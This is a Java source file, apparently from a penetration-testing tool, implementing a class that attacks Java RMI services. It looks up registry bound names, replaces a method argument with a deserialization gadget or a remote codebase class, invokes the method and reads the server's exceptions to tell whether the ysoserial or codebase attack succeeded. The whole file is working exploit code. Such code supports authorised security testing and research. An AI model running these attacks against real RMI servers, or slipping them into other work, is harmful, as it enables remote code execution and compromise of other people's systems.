package de.qtc.rmg.operations;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;

import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import javassist.CannotCompileException;
import javassist.NotFoundException;

public class MethodAttacker {

    private RMIWhisperer rmi;
    private HashMap<String,String> classes;
    private MethodCandidate targetMethod;

    private Field proxyField;
    private Field remoteField;

    public MethodAttacker(RMIWhisperer rmiRegistry, HashMap<String,String> classes, MethodCandidate targetMethod)
    {
        this.rmi = rmiRegistry;
        this.classes = classes;
        this.targetMethod = targetMethod;

        try {
            this.proxyField = Proxy.class.getDeclaredField("h");
            this.remoteField = RemoteObject.class.getDeclaredField("ref");
            proxyField.setAccessible(true);
            remoteField.setAccessible(true);

        } catch(NoSuchFieldException | SecurityException e) {
            Logger.eprintlnMixedYellow("Unexpected Exception caught during MethodAttacker instantiation:", e.getMessage());
            RMGUtils.exit();
        }
    }

    @SuppressWarnings({ "rawtypes", "deprecation" })
    public void attack(Object gadget, String boundName, int argumentPosition, String operationMode, int legacyMode)
    {
        Logger.printlnMixedYellow("Attacking", this.targetMethod.getSignature());

        if( boundName != null )
            Logger.printlnMixedBlue("Target name specified. Only attacking bound name:", boundName);
        else
            Logger.printlnMixedBlue("No target name specified. Attacking", "all", "available bound names.");

        Logger.println("");

        Iterator<Entry<String, String>> it = this.classes.entrySet().iterator();
        while (it.hasNext()) {

            Map.Entry pair = (Map.Entry)it.next();
            String name = (String)pair.getKey();
            String className = (String)pair.getValue();

            if( boundName != null && !boundName.equals(name) ) {
                continue;
            }

            Logger.printlnMixedYellow("Current bound name:", name);
            Logger.increaseIndent();

            int attackArgument = 0;
            try {
                attackArgument = this.targetMethod.getPrimitive(argumentPosition);
            } catch (CannotCompileException | NotFoundException e) {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "while searching for primitives.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

            if( attackArgument == -1 ) {
                Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", this.targetMethod.getSignature(), ".");
                RMGUtils.exit();
            }

            Logger.printlnMixedYellow("Found non primitive argument on position", String.valueOf(attackArgument));

            boolean isLegacy = false;
            if( (className.endsWith("_Stub") && legacyMode == 0) || legacyMode == 1) {
                Logger.increaseIndent();
                Logger.printlnMixedBlue("Class", className, "is treated as legacy stub.");
                Logger.printlnMixedBlue("You can use", "--no-legacy", "to prevent this.");
                Logger.decreaseIndent();
                isLegacy = true;
            }

            Remote instance = null;
            Class remoteClass = null;
            RemoteRef remoteRef = null;

            try {

                if( !isLegacy )
                    remoteClass = RMGUtils.makeInterface(className, this.targetMethod);

                else
                    remoteClass = RMGUtils.makeLegacyStub(className, this.targetMethod);

            } catch(CannotCompileException e) {
                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during interface creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;
            }

            try {
                instance = rmi.getRegistry().lookup(name);

                if( !isLegacy ) {
                    RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
                    remoteRef = ref.getRef();

                } else {
                    remoteRef = (RemoteRef)remoteField.get(instance);
                }

            } catch( Exception e ) {
                Logger.eprintlnMixedYellow("Error: Unable to get instance for", name);
                Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
                Logger.decreaseIndent();
                continue;
            }

            Method[] allMethods = remoteClass.getDeclaredMethods();
            Method attackMethod = allMethods[0];
            Object[] methodArguments = RMGUtils.getArgumentArray(attackMethod);

            Object[] payloadArray = new Object[2];
            Object randomInstance = null;

            try {
                Class randomClass = RMGUtils.makeRandomClass();
                randomInstance = randomClass.newInstance();

            } catch (CannotCompileException e) {
                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during random class creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;

            } catch (InstantiationException | IllegalAccessException e) {
                Logger.eprintlnMixedYellow("Caught", "InstantiationException", "during random class creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;

            } catch (NotFoundException e) {
                Logger.eprintlnMixedYellow("Caught", "NotFoundException", "during random class creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;
            }

            payloadArray[0] = gadget;
            payloadArray[1] = randomInstance;
            methodArguments[attackArgument] = payloadArray;

            try {
                Logger.println("Invoking remote method...");
                remoteRef.invoke(instance, attackMethod, methodArguments, this.targetMethod.getHash());

                Logger.eprintln("Remote method invocation didn't cause any exception.");
                Logger.eprintln("This is unusual and the attack probably didn't work.");

            } catch (java.rmi.ServerException e) {

                Throwable cause = RMGUtils.getCause(e);
                if( cause instanceof java.rmi.UnmarshalException ) {
                    Logger.eprintlnMixedYellow("Method", this.targetMethod.getSignature(), "does not exist on this bound name.");
                    continue;

                } else if( cause instanceof java.lang.ClassNotFoundException ) {

                    Logger.printlnMixedBlue("Caught", "ClassNotFoundException", "during deserialization attack.");
                    String exceptionMessage = e.getMessage();

                    if( operationMode.equals("ysoserial") ) {

                        if( exceptionMessage.contains(randomInstance.getClass().getName())) {
                            Logger.printlnYellow("Deserialization attack most likely worked :)");

                        } else {
                            Logger.eprintlnYellow("Deserialization attack probably failed.");
                            RMGUtils.stackTrace(e);
                        }
                    }

                    else if( operationMode.equals("codebase") ) {

                        if( exceptionMessage.contains("RMI class loader disabled") ) {
                            Logger.eprintlnYellow("Codebase attack failed.");
                            Logger.eprintlnMixedYellow("RMI class loader is", "disabled");
                        }

                        else if( exceptionMessage.contains(gadget.getClass().getName()) ) {
                            Logger.printlnYellow("Target should be vulnerable to codebase attacks.");
                            Logger.eprintlnMixedYellow("However, class could", "not be loaded", "from the specified remote endpoint.");
                        }

                        else if( exceptionMessage.contains(randomInstance.getClass().getName()) ) {
                            Logger.printlnMixedYellow("Remote class loader attempted to load dummy class", randomInstance.getClass().getName());
                            Logger.printlnMixedYellow("Attack", "probably worked");

                            Logger.increaseIndent();
                            Logger.eprintlnMixedYellow("If you got no callback, loading the attack class", gadget.getClass().getName(), "was skipped.");
                            Logger.eprintln("This could be either if the class is known by the server or it was already loaded before.");
                            Logger.eprintln("In this case, you should try a different classname");
                            Logger.decreaseIndent();

                        } else {
                            Logger.eprintlnMixedYellow("Caught", "ClassNotFoundException", "with unexpected content.");
                            RMGUtils.stackTrace(e);
                        }
                    }

                } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                    Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), "during " + operationMode + " attack.");
                    Logger.eprintln("This is usually caused by providing incompatible classes during codebase attacks.");
                    RMGUtils.stackTrace(e);

                } else {
                    Logger.eprintlnMixedYellow("Caught", "java.rmi.ServerException", "with unknown cause.");
                    RMGUtils.stackTrace(e);
                }

            } catch( java.lang.ClassCastException e ) {
                Logger.eprintlnMixedYellow("Caught", "ClassCastException", "during " + operationMode + " attack.");
                Logger.eprintln("This could be caused when attacking String parameters on a patched RMI server.");
                RMGUtils.stackTrace(e);

            } catch( Exception e ) {
                Logger.eprintlnYellow("Caught unexpected Exception during " + operationMode + " attack.");
                RMGUtils.stackTrace(e);
                continue;

            } finally {
                Logger.decreaseIndent();
                Logger.println("");
            }
        }
    }
}
